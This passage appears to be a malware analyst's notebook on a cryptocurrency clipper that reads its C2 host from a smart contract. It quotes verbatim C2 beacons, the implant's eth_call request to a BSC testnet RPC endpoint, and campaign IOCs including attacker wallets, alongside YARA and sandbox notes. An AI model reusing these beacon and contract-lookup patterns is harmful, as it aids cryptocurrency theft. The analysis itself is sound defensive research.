### What was changed, 23 Aug

Naming, not logic -- there was no logic defect to repair.

- The trigger is now **`root-exit`**, which is what it means, and its files are
  suffixed **`_rootexit`**. `process-exit` -> `_exit` stays in `TRIGGER_SUFFIXES`
  so images written before the rename remain interpretable; a four-run
  misreading is exactly when someone goes back to old dumps.
- Every dump record now carries **`alive_at_dump`**, taken from the process
  table at the moment the image is written. The trigger names the *tree's*
  event; this names the *process's* state, and nothing downstream has to infer
  the second from the first ever again.


## THE CLIPPER SUBSTITUTES FROM THE C2 RESPONSE, AND `method=send` IS ON THE WIRE — 22 Aug

**Both missing behaviours were produced, and the mechanism turned out to be
simpler and worse than expected.** Two runs, each supplying a clipboard the
sample could act on.

### `method=send&guid=&address=` — run `clip`, 19:57

    POST / HTTP/1.1
    Authorization: 4b817807-2731-459c-bc5d-4bd914c9eb55
    Host: c0ffee-sink.ringforge.test

    method=send&guid=4814CF26358FE5E4F8A1F9B0F4980910&address=0xC0FFEE…C0FFEE

The second beacon method, never previously seen. `address=` carries the **tracer
the bait had left on the clipboard**, so the implant is reporting the address it
observed a victim copy.

**And the method is chosen by what is on the clipboard.** This run sent *only*
`send`, no `refresh`. The two runs before it sent *only* `refresh`, no `send`.
One beacon per payload lifetime, and:

    clipboard holds no address    ->  method=refresh&guid=
    clipboard holds an address    ->  method=send&guid=&address=<observed>

That closes the protocol. It also retires "the implant was withholding `send`
because the response was wrong": it was withholding nothing, it had nothing to
report.

### Substitution, measured — run at 21:08

**167 consecutive bait rounds came back rewritten**, out of 248 total: 166
substituted, 81 clipboard failures, **one** clean read. What it wrote back:

    ﻿<html><body><h1>FakeNet-NG</h1><p>Default response page.</p></body></html>\r\n

Note the BOM and the trailing CRLF. That is `defaultFiles\FakeNet.html` served
verbatim as an HTTP body. **The clipper takes the C2's raw response body and
writes it into the clipboard with no parsing and no validation.** Point it at a
real C2 and those bytes are a wallet; point it at a sink returning HTML and it
pastes HTML.

That is the whole substitution mechanism, and it means the replacement was
*never* coming from the seventeen hardcoded wallets. Those are a table the rule
matches on, not the source of the swap.

### Then it takes the clipboard and does not give it back

    round 1    21:08:57   substituted
    …          every round
    round 167  21:11:49   substituted
    round 168  21:11:51   "Requested Clipboard operation did not succeed."
    …          81 consecutive failures
    round 248  21:14:05   still failing

From 21:11:51 nothing could open the clipboard at all — not the bait, and not
the operator, who could no longer paste inside the guest even after closing the
loop. Whether that lock coincides with `SecurityHealthHost` spawning is
**unverified**: that run's summary was never exported, and the run is
contaminated anyway (below). Worth pinning on a clean run, because a clipper
that holds the clipboard open is a much louder host artefact than one that polls.

### The contamination, which is its own finding

**Round 1 was already substituted, seconds into the run** -- long before that
run's own `csc.exe` compilations could have produced a clipper. There had been
no revert since the 19:57 detonation, so **the clipper from the previous run was
still resident.**

That is the first hard evidence that the clipping component outlives its run,
against a process tree where nothing persists and everything exits. It also
means the 21:08 timings cannot be attributed to that run's payload, and the
21:11:51 lock is only a candidate.

**One detonation per revert, without exception.** `vm_snapshot.ps1` has said so
since it was written; this is what ignoring it produces -- two samples' worth of
behaviour in one log, discovered only because round 1 was too early to be
explicable.

### What is left

- **Serve a real address as the response** and confirm the clipper pastes *that*.
  One variable, and `beacon_responder.py` already holds the shapes -- what it
  lacks is the FakeNet shim, which is the only unbuilt piece.
- **Which wallet formats trigger it.** `clipboard_bait.ps1 -AllFormats` cycles
  six; only ETH is measured.
- **Whether the clipboard lock is the beacon**, on a clean single-detonation run.


## PHASE 3'S CONTROL CAME BACK NEGATIVE, AND IT REFRAMES THE QUESTION — 22 Aug

**The response body is not what ends the process, and probably not what
withholds `method=send`.** Run `d2f8fe51`, identical to `4bb6b0d5` in every
respect except one: `tools\fakenet\defaultFiles\FakeNet.html` truncated to zero
bytes, so the beacon received a 200 with an empty body instead of FakeNet's
stock page.

                          phase 2 (HTML)   phase 3 (empty)
    SecurityHealthHost      spawn t125       spawn t158
                             exit t161        exit t194
    lifetime                     36s              36s
    beacons                        1                1
    method=send                   no               no
    victim guid           4814CF26…        4814CF26…

> **WRONG, corrected 23 Aug.** The process did not exit at all -- see *THE
> PAYLOAD DOES NOT EXIT AFTER 36 SECONDS*. The `process-exit` dump fires on
> ProcDump's false "Target process no longer running", and everything this
> subsection infers from a 36-second lifetime is unsupported. Kept as written
> because the reasoning below is a worked example of building on a measurement
> nobody checked.

**36 seconds, twice, to the second.** The beacon landed at spawn+26 in one run
and spawn+35 in the other, and the process still died at spawn+36 both times.
That is a fixed lifetime, not a reaction: **the implant is not exiting because
it disliked the answer.** Whatever ends it is a timer, and no response shape
will extend it.

**The victim GUID is stable across runs and across a revert.**
`4814CF26358FE5E4F8A1F9B0F4980910`, byte-identical, on a machine restored from a
snapshot in between. It is derived from something durable in the image -- check
it against `MachineGuid` -- and it is *not* per-run, so it identifies the
machine rather than the execution.

### What this retires, and what it leaves

**Narrowed, not retired: the response shape does not drive the *timer*.**
`empty` was the control because it is the cheapest thing the implant could
tolerate, and the 36 seconds did not move. So no response will buy more time,
and `beacon_responder`'s other five shapes will not extend the window.

> **Corrected, an hour after this section was first committed.** It originally
> read "Retired: the response-shape hypothesis ... five runs to confirm a null".
> That claims more than the control measured. The control tested *lifetime*, and
> lifetime is a fixed timer. It did not test whether a valid response changes
> what the sample *does* -- whether it installs persistence, or emits `send`.
> Those are separate questions and the second is now more interesting rather
> than less. Reading a null on one measurement as a null on all of them is the
> error this file keeps recording other people making.

**And the process tree makes the open question sharper.** Every descendant is
accounted for and none of them survives::

    harness (2040 in one run, 6084 in the next -- the launcher, not the sample)
    └── powershell.exe            THE SAMPLE: a 1.09 MB .ps1, not a PE
        ├── csc.exe x2            compiles C# loaded in-process
        │   └── cvtres.exe x2
        └── SecurityHealthHost    hollowed; eth_call + beacon; 36s

`pid 2040` was chased as a possible long-lived clipper and is the analyzer: the
sample is a script, so the harness starts `powershell.exe` to run it, and the
parent pid changes between runs exactly as a launcher's would.

**So nothing persists and nothing survives.** No autoruns, no task, no service,
no surviving dropped file, and the whole chain exits inside a few minutes. That
is not a working clipper -- a clipper has to watch the clipboard to be worth
anything -- which means either the clipping component is conditional, or this
sample is a stage that installs nothing until told to.

**The missing persistence and the missing `send` may be the same missing
thing:** a C2 response the implant can act on. That is a different experiment
from extending the window, and the control did not touch it.

**The remaining explanation is that there has never been anything to send.**
Read the two methods against what the clipper actually does:

    method=refresh&guid=            check in, fetch config
    method=send&guid=&address=      report a substitution that happened

Nobody has touched the guest's clipboard during any run. No copy event, no
substitution, nothing to report -- and `send` is the report. That explains the
absence without any assumption about response parsing, and it fits every
observation: one beacon, in, and out on a timer.

**So the next experiment is a clipboard event inside the window, not a better
answer.** A guest-local loop putting a known address on the clipboard for the
whole run, because spawn time varies (t125 against t158) and the window is only
36 seconds. Two dividends if it works: `send` on the wire at last, and a second
confirmation of substitution taken *inside* containment rather than through the
analyst's own clipboard.

### Containment now means the clipboard too

`clipboard="bidirectional"` was still set. That is the channel that rewrote the
analyst's clipboard on 22 Aug, and the experiment above deliberately hands a
clipper an address to rewrite.

`Set-Containment` in `vm_snapshot.ps1` now closes the clipboard and
drag-and-drop bridges alongside the network cable, on every restore. It belongs
in the same place and for the same reason: **snapshots capture hardware
configuration, so a revert restores whatever the snapshot held.** Verified by
running it -- `bidirectional` before, `disabled` after, with the restore in
between reopening it exactly as predicted.

The flag spelling was checked rather than assumed: VBoxManage 7.1.4 takes
`--clipboard-mode` and `--drag-and-drop`, and the older `--draganddrop` fails
silently on it. Both spellings are attempted, and a failure to close either half
warns rather than passing quietly, because the one thing worse than an open
channel is believing it shut.

### Two bench fixes proved themselves on this run

Neither needed a re-scan or a re-read to demonstrate.

- **The corrected YARA rules fired natively.** `rule_file_count: 1545`, and all
  three campaign rules matched -- `RingForge_Clipper_c14cb5b6_wallets` and
  `RingForge_EtherHiding_eth_call` on the `SecurityHealthHost` exit dump. First
  run where they matched without `rescan_memory_yara.py`, which is what the
  baseline carrying the hand-copied `local\` rules bought.
- **`network_iocs.json` told the truth, including about itself.**
  `notable_domains` now carries `data-seed-prebsc-1-s1.binance.org` and
  `c0ffee-sink.ringforge.test`, `sources` reads `['pcap', 'fakenet']`, and
  `pcap_blind` is `true` -- the report naming its own blind spot rather than
  presenting an empty section as a finding.


## THE BEACON REACHED THE SINK, AND `bare_host` IS THE ANSWER — 22 Aug

**One `eth_call`, one answer, no retry, and a beacon one second later.** Run
`4bb6b0d5` (`20260822_155802`), pinned to `bare_host`, `timeout 240`, offsets
`3, 10, 25, 55`.

    t+150s   eth_call  to 0x4E31128a, selector 0x3bc5de30
             answered  ABI string, offset 0x20, len 0x1a,
                       "c0ffee-sink.ringforge.test"
    t+151s   DNS       c0ffee-sink.ringforge.test
    t+151s   POST      https://c0ffee-sink.ringforge.test/
                       method=refresh&guid=...

**The acceptance argument is the retry count, not the absence of an error.**
Phase 1 recorded **seven** `eth_call`s hammering at ~500 ms intervals because
each was refused. This run recorded **one**, and then silence:
`plans_served: ["bare_host"]`, `all_plans_exhausted: false`. The implant asked
once, was answered, and stopped asking. **`getData()` returns a bare hostname
and the implant uses it as its C2.** The 22 Aug correction was right, and
`hex_url` never had to be spent.

### The beacon, verbatim

    POST / HTTP/1.1
    Authorization: 4b817807-2731-459c-bc5d-4bd914c9eb55
    Content-Type: application/x-www-form-urlencoded
    Host: c0ffee-sink.ringforge.test
    Content-Length: 52
    Cache-Control: no-cache

    method=refresh&guid=4814CF26358FE5E4F8A1F9B0F4980910

**Two identifiers, and they are not the same thing.** The `Authorization`
header is the **campaign GUID** -- `$guid` in the YARA rule, hardcoded in the
config block. Its *purpose* was unknown until now: it is the C2 credential. The
`guid=` in the body is a different 32-hex value and is almost certainly
per-victim; check it against the guest's `MachineGuid` with the dashes stripped.

### It chose `https://`, which is why the SAN mattered

`SecurityHealthHost.exe` (pid 7972) opened exactly two connections: `:8545` and
**`:443`**. Given a bare hostname the implant supplies `https://` on its own.

The beacon arrived **decrypted**, so the handshake succeeded against the
RingForge CA: **this implant does not pin.** Had the leaf still carried its
single SAN for the RPC host, that handshake would have failed the way run
`7ae41ca7` failed -- silent FIN, no request -- and the run would have read as
`bare_host` rejected. That is the fourth consecutive way this campaign has
offered to be misread as a rejection.

### What did not happen

**`method=send&guid=&address=` never fired.** Roughly 90 seconds passed between
the refresh and the end of the window with nothing further. The sink returned
FakeNet's stock page, which is unlikely to be what the implant expects back.

The window for a fix is narrow: the beacon lands at t+151 and
`SecurityHealthHost.exe` exits at t+161 (the `process-exit` dump). **Extending
the timeout buys nothing** -- the host process is gone. Answering `refresh`
plausibly is the only lever, and that is phase 3.

### Three bench defects this run exposed

None changed the result, and all three would have corrupted the *record*.

1. **`network_iocs.json` is a false negative.** It reports zero notable domains
   and zero external IPs for the run in which the sample fetched a C2 and
   beaconed to it, listing only Chromecast and SSDP noise. It reads
   `capture.pcapng` -- host-side `dumpcap`, 116 KB, which never saw the diverted
   traffic. Everything real is in FakeNet's own
   `packets_20260822_115813.pcap` and `fakenet_summary.json`, both of which
   carry `data-seed-prebsc-1-s1.binance.org` **and**
   `c0ffee-sink.ringforge.test`. An empty IOC section reads as a finding, which
   makes this worse than no section at all.

2. **The rule was not in the guest's scanned tree at all.**
   `memory_yara_summary.rules_dir` is `tools\yara\rules`, which is gitignored
   and populated only by `bootstrap_yara_rules.ps1`. On the guest that
   directory's `local\` subdirectory held **three** files -- `formbook_stage4`,
   `memory_canary`, `split_api_loader`, the first and last dated **16 Aug** --
   and **no `ringforge_etherhiding.yar` in any version**. The bootstrap has not
   run on that machine since 16 Aug, four days before the rule was first
   written, so it could never have been compiled.

   > **Corrected 22 Aug, after this section was first committed.** It originally
   > read "the scanned YARA copy is two days stale ... 1,980 bytes against the
   > canonical 4,401, `$con` still naming the wallet". That describes the *host*
   > clone, checked while writing this up, and the guest was assumed to match.
   > It did not: on the host the file is stale, on the guest it was absent.
   > Same trap, same remedy, different mechanism -- and asserting a mechanism
   > from the wrong filesystem is the identical error that put `0x0F14fc3b` in
   > the constant for two days. `formbook_stage4` was a revision behind on the
   > guest as well, so the drift was never specific to this rule.

   Only
   `RingForge_Split_API_Injection_Loader` matched, on 8 of 10 dumps;
   `RingForge_EtherHiding_eth_call` fired on none -- including the
   `SecurityHealthHost` exit dump, taken ten seconds after that process built
   the `eth_call` and sent the beacon. Whether that is the staleness or a real
   miss is answerable with `rescan_memory_yara.py` against the dumps already on
   disk, and **only until the next revert.**

   **This is the third recurrence, and the tool for it was written for the
   first.** `rescan_memory_yara.py` exists because run `38f27025` on 16 Aug
   reported `total_matches: 0` for this same reason, and its docstring states
   the trap in as many words: hand-written rules live in `tools\yara\local\`
   and reach the scanned tree only through the bootstrap. **A rule edited and
   committed is not a rule that will fire**, and nothing in the run says so --
   `rules_dir` is reported, its *freshness* is not. That is the thing worth
   fixing, rather than remembering to re-run the bootstrap a fourth time.

3. **`dynamic_fakenet_config_path` has no GUI field and does not survive a
   revert.** It is read only from `config.json`
   (`gui/dynamic_window.py`), and the window *writes it back* from an
   empty var on every save -- so editing `config.json` with the GUI open and
   then pressing Run silently discards it and runs the stock FakeNet config.
   Port 8545 is then never routed and the outcome is `no_connection`, which is
   indistinguishable from a diverter fault. The code comment beside it already
   says this happened once; it nearly happened again.


### The rescan settled it: the rules were fine, the copy was not

`rescan_memory_yara.py --rules-dir tools\yara\local --expect ...` against the
same dumps, no detonation. **24 of the rule file's 26 strings matched** on
`SecurityHealthHost.exe_7972_t161_exit.dmp` (77.4 MB), and
`dumps_with_matches` went 8 -> 9. The zero was the rule's **absence** from the
guest's bootstrap tree and nothing else -- `--expect` aimed at that tree would
have exited 3 rather than reporting a zero, which is exactly what it is for. We
got the right answer by pointing `--rules-dir` at `local`, not because the guest
was in a state that could have produced one.

**Resident in the payload at exit:** all 17 substitution wallets, and `$con` =
`0x4E31128a13AcBD1cF1909D67F072460c853F87f7` in EIP-55 form -- the corrected
contract confirmed in captured memory rather than only on the wire. **`$c2b`
(`method=send&guid=`) and `$c2c` (`&address=`) are both present**, so the
substitution beacon is an implemented code path that was never triggered, and
phase 3 is chasing something real.

**Both non-matches say something.**

- **`$c2` (`klopasnarhia.cc`) is absent, and that is the control working.** The
  responder served `c0ffee-sink.ringforge.test`, so the real C2 never entered
  memory. Its absence is positive evidence that the substitution held and the
  implant did not reach the chain by some other route.
- **`$selector` missed while `$sel_bare` hit.** `$tmpl` sits at dump offset
  5561499 and `$sel_bare` at 5561613 -- two separate literals 114 bytes apart.
  The `eth_call` is assembled from fragments at runtime, so the composed
  `"data":"0x3bc5de30"` exists only on the wire. `$selector` is therefore dead
  against memory, and a later cleanup that removes `$sel_bare` as its duplicate
  would silently cost the memory match. Noted in the rule itself.

**Two clusters, and the second is the live request buffer.**

    ~5.56 MB   $guid 5561024  $tmpl 5561499  $sel_bare 5561613
               $c2a 5561642   $c2b 5561662   $c2c 5561679    <- string table
    ~16.62 MB  $guid 16621538              $c2a 16621706     <- assembled request

The second pair is 168 bytes apart and 11 MB from the table, in the order the
wire showed: the `Authorization` GUID, then `method=refresh&guid=`. That is the
outgoing beacon in memory, locatable by offset. A third `$guid` copy sits at
1647342.

**Hollowing, cleanly.** Only the `SecurityHealthHost` exit dump carries either
payload rule; every `powershell.exe` and `csc.exe` dump carries only
`RingForge_Split_API_Injection_Loader`. The payload exists solely in the
injected host, and the `process-exit` trigger is the only thing that caught it
-- which is `timeout 240` earning its keep for the second time.

### Where this leaves `0bw`

Proven, on the wire, in one run:

- `getData()` -> bare hostname -> the implant's C2. EtherHiding delivery, end to
  end, with the operator choosing the destination.
- The transport is HTTPS on 443, and the certificate is **not pinned**.
- The campaign GUID is the `Authorization` credential.
- A per-victim 32-hex ID travels in the body.

Still open:

- **`method=send&address=`** -- the substitution beacon. Needs a plausible
  answer to `refresh` inside a ~10-second window.
- **The contract's transaction history** -- deployer and rotation timeline. Not
  pulled; it is a query against the live chain from this network.
- **`klopasnarhia.cc`** -- still unresolved and unqueried by this bench.


## THE CONTRACT IS LIVE AND THE C2 IS `klopasnarhia.cc` — 22 Aug

**One read of the chain answered what four detonations could not.**

    address    0x4E31128a13AcBD1cF1909D67F072460c853F87f7
    chain      BSC testnet, chainId 0x61
    bytecode   2,008 bytes -- deployed, not an empty address
    getData()  ABI string: offset 0x20, length 0x0f, "klopasnarhia.cc"
    balance    0
    selectors  0x3bc5de30 getData() public; 0x47064d6a reverts for us --
               an owner-gated setter, i.e. the rotation channel

**`klopasnarhia.cc` is the beacon C2.** It is in **no static artefact** -- not
the config block, not the carve, not any string table -- which is the entire
point of EtherHiding. The beacon strings (`method=refresh&guid=`,
`method=send&guid=&address=`) carry no host precisely because the host arrives
from the chain, and `0x47064d6a` means it can be rotated without touching the
malware.

### It also corrects the phase 2 reasoning

**`getData()` returns a properly ABI-encoded string.** The 22 Aug reading of the
payload's string table -- `result` and `0x` adjacent, a hex alphabet nearby, no
ABI machinery visible -- suggested a naive client that hex-decodes without
ABI-decoding. **That was wrong**, and the chain disproved it before `hex_url`
cost a run.

So the four rejected shapes were rejected on **content, not framing**.
`url_https` served `https://c0ffee-sink.ringforge.test/` -- 35 bytes, scheme and
trailing slash. The real payload is a bare hostname, 15 bytes, no scheme, no
slash. **`bare_host` is the correct shape**, and it was the one skipped on the
strength of the wrong reading.

### What this closes and what it opens

Substitution was already demonstrated (see the clipboard entry) and needs no
fetch. What the fetch gates is the **beacon**, and its destination is now known
without ever having to make the implant accept an answer.

Still open:

- **A `bare_host` run**, serving a hostname-shaped sink, to watch the beacon
  protocol itself -- what it sends, when, and whether `address=` carries a
  substituted wallet.
- **The contract's transaction history**, which would date the campaign and name
  the deploying wallet. Not yet pulled.
- **`klopasnarhia.cc` itself** -- unresolved and unqueried by this bench.

### Recorded so the next reader does not repeat it

`eth_getCode` on 20 Aug returned `0x` and was written up as "the contract is
dead, this sample is inert in the wild". It was aimed at `0x0F14fc3b`, which is
a **wallet**. An address with no code returns `0x` whether or not a contract
exists elsewhere. **Two days of "nothing left to give" rested on querying the
wrong address**, and the correction cost one RPC call once the right one was
known.


## THE CLIPPER SUBSTITUTES, AND IT DID IT TO US — 22 Aug

**The behaviour this sample has never been observed performing was observed on
22 Aug, through the analyst's own clipboard.** It needed no successful
`getData()`, which is the part that reframes `0bw`.

**What happened.** A command was copied from the analysis chat into the guest's
terminal. It contained the phase 2 tracer address. What arrived in the terminal
was the clipper's own ETH wallet:

    sent      s='0xC0FFEE0000000000000000000000000000C0FFEE'
    pasted    s='0x0F14fc3bfAc3726172aCd08Fe4bFb79B633E76ff'

Terminal output copied *back out* of the guest was rewritten the same way.
Comparing a paste against the same file read over the share gives the
transformation exactly:

    in the file  0x0f14fc3bfac3726172acd08fe4bfb79b633e76ff   (our constant)
    as pasted    0x0F14fc3bfAc3726172aCd08Fe4bFb79B633E76ff

    in the file  0xC0FFEE0000000000000000000000000000C0FFEE   (the tracer)
    as pasted    0x0F14fc3bfAc3726172aCd08Fe4bFb79B633E76ff

**Two different inputs, one output: the wallet at index 4 of the substitution
table.** Substitution demonstrated, not inferred.

### It explains three anomalies recorded as unexplained

All three were the same mechanism, and all three cost hours on 21–22 Aug.

1. **`ETHERHIDING_CONTRACT` "changing case in the file".** The constant is
   `0x0f14fc3b…` lowercase. Copied out of the guest it came back checksummed,
   and `git status`, `git show`, `git cat-file` and a fresh Python import all
   "agreed" it was checksummed. Nothing on disk had changed — every one of those
   readings reached the analyst through a copy-paste. The file read over the
   share was byte-identical to the host's, SHA-256 included.
2. **Why it defeated every cache theory.** Git's stat cache and CPython's `.pyc`
   revalidation were both blamed, plausibly, because a case-only edit preserves
   size and mtime. Neither was involved.
3. **Why it vanished after a revert and returned after a detonation.** It was
   never in the image. It was a running process.

**The substitution is invisible when the copied address is already the
attacker's wallet** — only the case changes, because the clipper rewrites in
EIP-55 form. That is exactly the case that occurred first, which is why it read
as a formatting quirk rather than a hijack.

### Consequences for the bench

**Terminal output copied from a detonated guest is not evidence.** Anything
carrying a crypto address may have been rewritten between the guest and the
notes. **Use the share** — a file copy does not pass through the clipboard, and
the phase 2 summary read that way showed the correct tracer and the correct
lowercase constant while the pasted copy showed neither.

**The analyst's clipboard is in scope while a sample runs.** The guest is
contained, but the clipboard is the analyst's, and it is being rewritten.

### What it means for `getData()`

Substitution runs **without** any successful contract fetch. Combined with the
EVM wallet being hardcoded alongside sixteen others, `getData()` is not
delivering a substitution address. The beacon has no host anywhere in the config
block, which makes a **C2 endpoint** the remaining candidate — and `url_https`,
`bare_host` and `json_c2` were added to the phase 2 planner on that reasoning.


## THE CARVE IS IDENTIFIED — a multi-chain clipper with EtherHiding C2, 20 Aug

**Run `c14cb5b6`'s 258 KB payload is a cryptocurrency clipper that reads its
C2 address from a smart contract.** Gap 5's carve branch has its first
identified payload, and the file is off the guest at
`G:\ringforge-artifacts\c14cb5b6_carved\` — it survives reverts now.

### What it is

x64 PE, GUI subsystem, 258,048 bytes, **not .NET, not packed** (max section
entropy 6.50 in `.text`). **Import table is empty** — confirmed by pefile and
LIEF independently — alongside a non-standard `.fptable` section, which
together read as dynamic API resolution through a function-pointer table.
Header is **timestomped**: `0xAB353A80` is epoch 2872392320, roughly 2061,
past the signed-32-bit boundary, which is why the carve summary's `compiled`
field came back empty rather than wrong. Preferred base `0x140000000`, mapped
at `0x164b7250000`, `.reloc` intact. Has a `.tls` section.

Toolchain is **probably Zig, unconfirmed**: `aborting due to recursive panic`,
`thread  panic:`, `Cannot print stack trace: stack tracing is disabled`, and
`NO_COLOR`/`CLICOLOR_FORCE` all fit. Searches for `zig`, `.zig`, and the usual
Rust markers came back empty — but a release build strips those anyway, so
that test was weaker than it looked. Do not record this as settled.

### The IOCs

> **CORRECTED 22 Aug, by reading the request off the wire.** The 20 Aug entry
> named `0x0F14fc3b…` as the contract and concluded no EVM destination existed
> in the binary. **Both halves were wrong**, and only a live request could show
> it: run `20260822_134019` captured seven `eth_call`s through a TLS responder
> the implant trusted, and every one asked for a *different* address. Going back
> to the carve with that address in hand, both are present, 1,581 bytes apart,
> and their surroundings settle which is which — `0x0F14fc3b` sits **inside the
> wallet table**, between a BTC bech32 and a BCH cashaddr; `0x4E31128a` is
> embedded in the `eth_call` template itself.

Config block is contiguous at file offsets 148728–150541: wallets, then
identity, then C2.

    contract   0x4E31128a13AcBD1cF1909D67F072460c853F87f7   <- queried, confirmed on the wire
    selector   0x3bc5de30   (getData())
    RPC        data-seed-prebsc-1-s1.binance.org:8545   (BSC testnet, HTTPS)
    guid       4b817807-2731-459c-bc5d-4bd914c9eb55
    beacon     POST, application/x-www-form-urlencoded
               method=refresh&guid=
               method=send&guid=&address=

**The request, verbatim, as it left the implant:**

    POST / HTTP/1.1
    Content-Type: application/json
    Host: data-seed-prebsc-1-s1.binance.org:8545
    Content-Length: 136
    Cache-Control: no-cache

    {"id":1,"jsonrpc":"2.0","method":"eth_call","params":[{"to":"0x4E31128a13AcBD1cF1909D67F072460c853F87f7","data":"0x3bc5de30"},"latest"]}

No `User-Agent`, `Cache-Control: no-cache`, and `id` ordered before `jsonrpc` —
a hand-rolled client, not a library, consistent with the Zig hypothesis. **No
handshake precedes it**: no `eth_chainId`, no `net_version`, straight to the
call. Seven attempts on one keep-alive connection, ~510 ms apart for five then
three inside 11 ms, then it gives up rather than looping.

**Seventeen substitution wallets, not the ten first recorded.** The missed ones
are whole chains — BCH, XRP, Algorand, TON and Cosmos — plus a third BTC and a
third LTC format. In file order:

    BTC    19eWJh8J6Mx9DrGXKEv3ojKmqw8Cv9pscK
    BTC    3BFNGKQZW9FcwxHmBGNfctsCdiSiqT8qZk
    BTC    bc1qtmvdcp0p5j3jd9a4k8e8qvv5gy9hrg7w28wxkg
    ETH    0x0F14fc3bfAc3726172aCd08Fe4bFb79B633E76ff   <- a WALLET, not the contract
    BCH    qzmvjauj8j2parcdn0a54samn9trnqf30cdufdf555
    LTC    LUut5sRxQzEPUM6NobeyanY9Yi748ZztsX
    LTC    MAkF7mCn3tPqp662daybvERzwsKQYqnzM8
    LTC    ltc1qdfryskhwlwyernnpf348qtsh36rereugpgyu9s
    DOGE   DJhtvoh4N49pt2yfTQWgjnStBBnD4KdbRy
    XRP    rpZEAWYtiB6bJ16NuLbGCc6CZ6jJdKfb63
    DASH   Xet9CxZ8ihR3Cqu32nbShKABRf2FTUqXxd
    TRX    TWXh8n73LuT5MJ23pd8dCjFskRZckveFbP
    RVN    RTCqpJfyxBS4J3p2b5e5EKju1cc1FjKiMh
    ALGO   U65INNXNQYFK5WO5KI4UKDJV7XVVUJ36UCVRCQLGYW7ST7IFNM6ZWHASIM
    TON    UQBNOrnQlzo3ftqm0Jj5Sf9zEHlPApapd-rWsAHREzkweiTw
    ATOM   cosmos1qmxpyqgh3auy2k090cqu4q7h4y52j0pjv2cp07
    SOL    DcJHrrHSgvFpsYxqb6g97uaQTd2kE31rPUeDZTeDsjVq

Base58, Bech32, Base32 and Base64url alphabets sit directly beside them —
those are the address parsers, the table above is the substitution targets,
and `address=` is the report channel. **Clipper is demonstrated, not
inferred.** The EVM destination **is** hardcoded like every other chain, so
`getData()` fetches something else — a C2 host for the beacon is the obvious
candidate and is now testable, since phase 2 can answer the call.

> **`0x4E31128a` has never been checked on-chain, and the "contract is dead"
> finding does not apply to it.** That test was `eth_getCode` against
> `0x0F14fc3b`, which is a wallet — an address with no code returns `0x`
> whether or not anything was ever deployed anywhere else. So **"`af2d8300…`
> has nothing left to give" is withdrawn**: the reasoning rested on a dead
> contract that was never the contract.

Detection is committed: `tools\yara\local\ringforge_etherhiding.yar`, two
rules — technique and campaign, kept separate so contract rotation cannot
stale out the durable one. **Neither carries a PE anchor**, deliberately, so
they match raw memory dumps where the header is not at offset 0. Both were
re-keyed on 22 Aug; 19 campaign strings match the payload and neither fires on
the `csc.exe` carves.

**The campaign rule would have missed this sample on its contract.** It keyed
on `0x0F14fc3b`, and the wallet list carried it, so `2 of them` still matched —
by accident, on a wallet, not on the contract it named. The responder caught
the real one only because `_is_target_call` matches contract **or** selector:
an `and` would have graded all seven `other_rpc` and the run would have read as
"it asked for something else".

### Why it exited at t198, and it is not anti-analysis

The implant resolved `data-seed-prebsc-1-s1.binance.org` and opened TCP to
`:8545` — **into FakeNet**, which has no idea how to answer `eth_call`. It
asked for its C2 address, got nothing usable, and exited. Everything
downstream of the config fetch was gated on an answer containment guaranteed
it would never get. That is the whole explanation for the short life; the
`process-exit` trigger at t198 is what produced the carve at all.

**~~The contract is dead.~~ RETRACTED 22 Aug.** `eth_getCode` returned `0x` on
BSC testnet *and* mainnet as of 20 Aug — but against `0x0F14fc3b`, which is a
**wallet**, not the contract. An address with no code returns `0x` whether or
not a contract was ever deployed elsewhere, so that query established nothing
about this sample's C2. The contract is `0x4E31128a13AcBD1cF1909D67F072460c853F87f7`
and **remains unchecked**. "This sample is inert in the wild" and "re-detonating
will never show more than this run did" both fall with it: run
`20260822_134019` re-detonated and captured the request.

### NEW GAP: containment blocks EtherHiding at the first request

FakeNet gives this class of malware a TCP peer, not a JSON-RPC response, and
the real chain now has nothing to give it either. **A minimal responder that
answers `eth_call` with an operator-controlled `getData()` payload is the only
remaining path** to the substitution logic, the beacon protocol and the
clipboard behaviour. It is *safer* than arming the guest, not riskier — you
choose which C2 the implant is handed, and point it at a local sink.

### Five results that were about the tooling, not the sample

Every one looked like a finding and was an artifact of the bench:

- `strings.txt` empty — `strings.exe` is not installed; the step fails with
  `[WinError 2]` and **still leaves the empty file behind**. The payload's
  strings are in the clear; PowerShell found them immediately.
- capa **aborted the entire run** on missing rules while YARA degraded
  gracefully on the same condition. **Fixed, `4d30e43`** — `step_capa` now
  returns `rc=2` like `step_yara`, clears stale `capa.json`/`capa.txt` so a
  previous run's output cannot be read as this one's, and the report says
  *capa did not run* rather than *no techniques detected*.
- 1593 rule files reported `matched: false` while compiling **zero** —
  `yara.compile` was called without `externals=`, and one Neo23x0 rule using
  `filepath` took down the whole set including the local rules. **Fixed,
  `1264b1c`** — externals declared, unbuildable files now named in
  `rules_skipped` instead of taking everything with them, and the summary
  prints `N of M` so a corpus that did not build cannot read as a clean scan.
  Verified at 1594 of 1594 compiling.
- capa's `Analysis Tool Discovery::Process detection` is a **false positive**:
  `/frida(\.exe)?/i` is unanchored and matched **"Friday"** in a day-name
  table. There is no analysis-tool detection in this payload, and no reason
  to change run configuration on its account.
- **`tools\yara\local\` is the source; `tools\yara\rules\` is what static
  triage actually scans.** Adding a rule to the former does not put it in the
  latter — `bootstrap_yara_rules.ps1` is what copies `local\` into
  `rules\local\`. Until it re-runs, a newly written local rule is silently
  absent from every static triage, and the scan reports success without it.
  **Re-run the bootstrap, or copy the file across, after writing a local
  rule** — and confirm by watching `rule_file_count` go up.

**`_run_step` still has no `try`/`except`** (`engine.py`, `res = fn()`). capa
was not a special case: **any** step that raises outside `run_cmd` kills the
whole triage the same way, and the resilience that `file` and `strings` have
comes from `run_cmd` catching internally, per step and ad hoc. A guard in
`_run_step` converting an unhandled exception to `rc=-1` with the traceback in
`stderr` would close the class rather than the instance. Not done — it changes
every step's behaviour, so it wants a deliberate decision rather than being
folded into a fix for one of them.

> **The method lesson, extended.** The existing note says every wrong turn was
> a guess about cost or blame, cheaper to measure than argue. This session is
> the same failure wearing different clothes: **the instrument's output
> mistaken for the specimen's behaviour.** `analysis.log` answered it on the
> first read every time — it names which step failed and why, and an empty
> output file next to a `STEP_FAIL` line is not a result. Read the log before
> reading the results.

### For open decision 1

This hollow is a **third shape**, and the decision as written does not account
for it: a **private allocation** at `0x164b7250000` with the host image
**untouched** (module integrity: `identical 66, patched 0, replaced 0`). Not
FormBook taking `RegSvcs`'s `0x400000` with the real image relocated away, and
not benign CLR assemblies inside `csc.exe`. Lineage is
